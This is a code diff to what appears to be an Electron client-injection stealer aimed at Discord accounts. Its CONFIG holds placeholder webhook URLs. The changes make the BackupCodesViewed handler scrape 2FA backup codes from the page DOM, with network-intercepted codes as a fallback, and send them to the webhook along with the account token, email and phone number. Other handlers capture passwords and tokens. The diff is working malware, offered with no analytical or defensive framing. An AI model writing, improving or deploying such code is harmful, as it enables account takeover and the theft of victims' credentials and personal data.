@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%INJECT_WEBHOOK%", 
+    webhook: "%INJECT_WEBHOOK%",
     dualhook: "%INJECT_DUALHOOK%",
     filters: {
         urls: [
@@ -450,48 +450,78 @@ const EmailPassToken = async (email, password, token, action) => {
         }]
     };
 
-    hooker(content, token, account);
+    await hooker(content, token, account);
 }
 
 const BackupCodesViewed = async (codes, token) => {
-    const account = await fetchAccount(token)
+    debugLog(`BackupCodesViewed called with ${codes ? codes.length : 'null'} codes`);
+    try {
+        const account = await fetchAccount(token)
 
-    const filteredCodes = codes.filter((code) => {
-        return code.consumed === false;
-    });
+        // Use DOM scraping as primary method like in the old script
+        const domCodesScript = `(function() {
+            const elements = document.querySelectorAll('span[class^="code_"]');
+            let p = [];
+            elements.forEach((element) => {
+                const code = element.textContent;
+                p.push(code);
+            });
+            return p;
+        })()`;
 
-    let message = "";
-    for (let code of filteredCodes) {
-        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
-    }
-    const content = {
-        "content": `${account.username} 2fa kodlarını al `,
-        "embeds": [{
-            "fields": [{
-                "name": "kodlar",
-                "value": "```" + message + "```",
-                "inline": false
-            },
-            {
-                "name": "tokencik",
-                "value": "`" + token + "`",
-                "inline": false
-            },
-            {
-                "name": "posta",
-                "value": "`" + account.email + "`",
-                "inline": true
-            }, {
-                "name": "nokia 3310",
-                "value": "`" + (account.phone || "None") + "`",
-                "inline": true
+        let allCodes = [];
+        try {
+            const domCodes = await executeJS(domCodesScript);
+            if (domCodes && Array.isArray(domCodes)) {
+                allCodes = domCodes;
             }
-            ]
+        } catch (e) { debugLog("DOM scraping error: " + e.message); }
 
-        }]
-    };
+        // Fallback to network intercepted codes if DOM failed or returned empty
+        if (allCodes.length === 0 && codes && Array.isArray(codes)) {
+            allCodes = codes.filter(c => c.consumed === false).map(c => c.code);
+        }
 
-    hooker(content, token, account);
+        let message = "";
+        for (let code of allCodes) {
+            // Check if code matches the pattern (alphanumeric 8 chars usually) or is already formatted
+            if (code.length === 8) {
+                message += `${code.substr(0, 4)}-${code.substr(4)}\n`;
+            } else {
+                message += `${code}\n`;
+            }
+        }
+        const content = {
+            "content": `${account.username} 2fa kodlarını al `,
+            "embeds": [{
+                "fields": [{
+                    "name": "kodlar",
+                    "value": "```" + message + "```",
+                    "inline": false
+                },
+                {
+                    "name": "tokencik",
+                    "value": "`" + token + "`",
+                    "inline": false
+                },
+                {
+                    "name": "posta",
+                    "value": "`" + account.email + "`",
+                    "inline": true
+                }, {
+                    "name": "nokia 3310",
+                    "value": "`" + (account.phone || "None") + "`",
+                    "inline": true
+                }
+                ]
+
+            }]
+        };
+
+        await hooker(content, token, account);
+    } catch (e) {
+        debugLog(`Error in BackupCodesViewed: ${e.message}`);
+    }
 }
 
 const PasswordChanged = async (newPassword, oldPassword, token) => {
